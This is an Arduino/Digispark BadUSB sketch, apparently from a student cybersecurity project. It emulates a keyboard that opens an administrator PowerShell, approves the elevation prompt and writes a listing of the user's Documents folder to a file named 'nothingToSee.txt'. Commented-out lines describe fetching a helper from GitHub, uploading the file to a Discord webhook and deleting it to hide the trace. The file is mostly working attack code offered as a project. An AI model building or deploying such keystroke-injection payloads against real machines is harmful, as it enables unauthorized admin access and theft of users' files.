#include "DigiKeyboard.h"
#define KEY_UP 0x52
#define KEY_DOWN 0x51
#define KEY_LEFT 0x50
#define KEY_RIGHT 0x4F

void setup() {
  DigiKeyboard.update();
  // Accessing PowerShell
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT); // opens the execute popup
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_A); // selects "PowerShell (Admin)"
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_LEFT); // selects "yes"
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // hits enter

  // Accessing the Documents Folder
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("$pathDocs = [Environment]::GetFolderPath('MyDocuments')"); // gets the folder path
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("cd $pathDocs"); // changes directory into that path
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("ls | Out-File -FilePath nothingToSee.txt"); // lists the contents of the folder
                                                                    // and outputs it on a text file in the same directory

  //DigiKeyboard.delay(1000);
  // This line is the one that gets the function from git-hub

  //Digikeyboard.delay(1000);
  //DigiKeyboard.print("Upload-Discord -file .\nothingToSee.txt"); // uploads the file to the Discord webhook

  //DigiKeyboard.delay(1000);
  //DigiKeyboard.println("rm nothingToSee.txt"); // removes the log file after uploading to Discord
  
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("exit");  // closes the PowerShell window

  // DEVELOPED BY MARCOS RODRIGUEZ (MIKE ROBLES) FOR TEAM ECHO
  // WATCHDOGS CYBERSECURITY - BADUSB PROJECT
  // JANUARY 2024
}

void loop() {
  // put your main code here, to run repeatedly:

}
